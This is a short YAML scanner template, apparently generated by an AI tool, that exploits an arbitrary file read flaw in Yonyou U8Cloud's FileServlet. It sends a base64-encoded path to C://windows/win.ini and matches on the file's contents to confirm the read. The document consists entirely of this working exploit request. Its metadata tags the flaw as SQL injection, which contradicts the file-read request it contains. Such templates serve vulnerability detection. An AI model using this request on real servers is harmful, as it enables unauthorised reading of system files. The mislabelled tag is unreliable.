id: poc-yaml-yongyou-u8cloud-fileservlet-anyfile-read
info:
  name: 用友U8Cloud FileServlet 任意文件读取漏洞
  author: ProjectDiscoveryAI
  severity: critical
  tags: sql-injection
http:
  - method: GET
    path:
      - "/service/~hrpub/nc.bs.hr.tools.trans.FileServlet?path=QzovL3dpbmRvd3Mvd2luLmluaQ=="
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "[files]"
          - "for 16-bit app support"
        condition: and
      - type: word
        words:
          - "<"
        condition: or
        negative: true
